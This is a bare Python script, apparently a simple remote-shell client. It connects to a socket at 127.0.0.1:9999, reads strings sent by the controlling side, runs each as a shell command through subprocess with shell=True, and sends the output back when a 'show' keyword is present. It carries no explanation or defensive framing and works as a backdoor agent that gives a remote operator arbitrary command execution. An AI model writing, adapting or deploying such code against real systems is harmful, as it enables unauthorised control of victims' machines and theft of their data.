import socket
import subprocess


ip_port = ('127.0.0.1', 9999)
s = socket.socket()
print(s)
s.connect(ip_port)


while True:
    re = s.recv(2048).decode()
    re_s = re.split(' ')
    if re =='echo [+] Command Send Done! && exit':
        s.close()
        break
    elif re != '':
        if re_s[6] == 'show':
            re2 = re.split(' ')
            del re2[6]
            data2 = ' '.join(re2)
            a = (subprocess.Popen(data2,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,close_fds=True))
            a.wait()
            b = a.stdout.read()
            s.send(b)
        else:
            a = (subprocess.Popen(re,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,close_fds=True))
            a.wait()

s.close()
